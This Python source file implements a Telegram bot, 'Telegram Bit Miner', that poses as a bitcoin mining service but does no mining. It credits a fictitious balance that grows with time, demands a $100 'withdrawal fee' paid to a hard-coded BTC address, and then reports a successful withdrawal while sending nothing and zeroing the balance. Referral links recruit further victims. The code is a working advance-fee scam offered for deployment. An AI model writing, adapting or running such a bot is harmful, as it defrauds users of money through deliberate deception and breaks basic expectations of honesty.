import os
import time
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import asyncio

# Read token from environment variable
TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    raise ValueError("No BOT_TOKEN found in environment variables")

# In-memory user data
user_data = {}

# Helper to get BTC price
def get_btc_price():
    try:
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd", timeout=8)
        return float(r.json()["bitcoin"]["usd"])
    except Exception:
        return 30000.0

# Sidebar / keyboard
def get_sidebar():
    keyboard = [
        [InlineKeyboardButton("⛏ Mine", callback_data="mine")],
        [InlineKeyboardButton("📊 Balance", callback_data="balance")],
        [InlineKeyboardButton("📤 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("➕ Add Wallet", callback_data="add_wallet")],
        [InlineKeyboardButton("ℹ️ About Info", callback_data="about")],
        [InlineKeyboardButton("👥 Referral", callback_data="referral")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Ensure user exists
def ensure_user(user_id):
    if user_id not in user_data:
        user_data[user_id] = {"balance": 0.0, "wallet": None, "last_check": time.time(), "referral_bonus": 0.0}

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    ensure_user(user_id)

    if context.args:
        referrer_id = context.args[0]
        if referrer_id != str(user_id):
            ensure_user(referrer_id)
            user_data[referrer_id]["balance"] += 0.10 / get_btc_price()

    await update.message.reply_text(
        "👋 Welcome to Telegram Bit Miner! 🚀\n"
        "⏳ Earnings: $0.50 every 2 minutes continuously.\n"
        "Tap buttons below to start:",
        reply_markup=get_sidebar()
    )

# Handle button presses
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    ensure_user(user_id)
    data = user_data[user_id]

    now = time.time()
    elapsed = now - data["last_check"]
    btc_per_2min = 0.5 / get_btc_price()
    btc_per_sec = btc_per_2min / 120
    data["balance"] += btc_per_sec * elapsed
    data["last_check"] = now
    usd_balance = data["balance"] * get_btc_price()

    if query.data == "mine":
        await query.edit_message_text(
            "⛏ Mining runs automatically in background.\n💰 Earn $0.50 every 2 minutes.",
            reply_markup=get_sidebar()
        )
    elif query.data == "balance":
        progress_fraction = (elapsed % 120) / 120
        progress_steps = int(progress_fraction * 10)
        bar = "🔺" * progress_steps + "▫️" * (10 - progress_steps)
        seconds_remaining = max(0, int(120 - (elapsed % 120)))
        await query.edit_message_text(
            f"📊 Balance:\n{bar}\n💰 {data['balance']:.6f} BTC (~${usd_balance:.2f})\n"
            f"⏱ Next credit in: {seconds_remaining} sec",
            reply_markup=get_sidebar()
        )
    elif query.data == "withdraw":
        if usd_balance < 500:
            await query.edit_message_text(f"⚠️ Minimum withdrawal is $500.\nBalance: ${usd_balance:.2f}", reply_markup=get_sidebar())
        elif not data["wallet"]:
            await query.edit_message_text("📥 No wallet found. Use Add Wallet first.", reply_markup=get_sidebar())
        else:
            fee_btc = 100 / get_btc_price()
            kb = [[InlineKeyboardButton("Confirm Withdraw", callback_data="confirm_withdraw")]]
            await query.edit_message_text(
                f"📤 To withdraw, first pay a $100 fee ({fee_btc:.6f} BTC) to:\nbc1qrucwx02e0m8v4smp44ferp93ynvsaw277t088f\n"
                "After payment, press confirm:",
                reply_markup=InlineKeyboardMarkup(kb)
            )
    elif query.data == "confirm_withdraw":
        fee_btc = 100 / get_btc_price()
        withdrawn = max(0.0, data["balance"] - fee_btc)
        data["balance"] = 0.0
        await query.edit_message_text(
            f"✅ Withdrawal successful!\nAmount sent: {withdrawn:.6f} BTC\nWallet: {data['wallet']}\n💰 New balance: 0 BTC\n\n"
            "⚠️ Make sure you paid $100 fee first!",
            reply_markup=get_sidebar()
        )
    elif query.data == "add_wallet":
        await query.edit_message_text("💳 Please send your BTC wallet address.", reply_markup=get_sidebar())
    elif query.data == "about":
        await query.edit_message_text(
            "ℹ️ This is Telegram Bit Miner.\n💰 Earn $0.50 every 2 minutes continuously.\n⏳ You can mine for over a year!",
            reply_markup=get_sidebar()
        )
    elif query.data == "referral":
        referral_link = f"https://t.me/TLbitminerbot?start={user_id}"
        await query.edit_message_text(
            f"👥 Invite friends and earn extra!\n💰 You'll earn $0.10 for every user that uses your referral link.\n\n"
            f"Here is your referral link:\n{referral_link}",
            reply_markup=get_sidebar()
        )

# Handle user messages
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    ensure_user(user_id)
    text = update.message.text.strip()
    if text.startswith(("1", "3", "bc1")):
        user_data[user_id]["wallet"] = text
        await update.message.reply_text(f"✅ BTC wallet saved: {text}", reply_markup=get_sidebar())
    else:
        await update.message.reply_text("⚠️ Invalid input. Tap buttons below.", reply_markup=get_sidebar())

# Main
async def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await app.run_polling()

# Render-friendly event loop
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except RuntimeError:
        # If event loop already running, use this
        loop = asyncio.get_event_loop()
        loop.create_task(main())
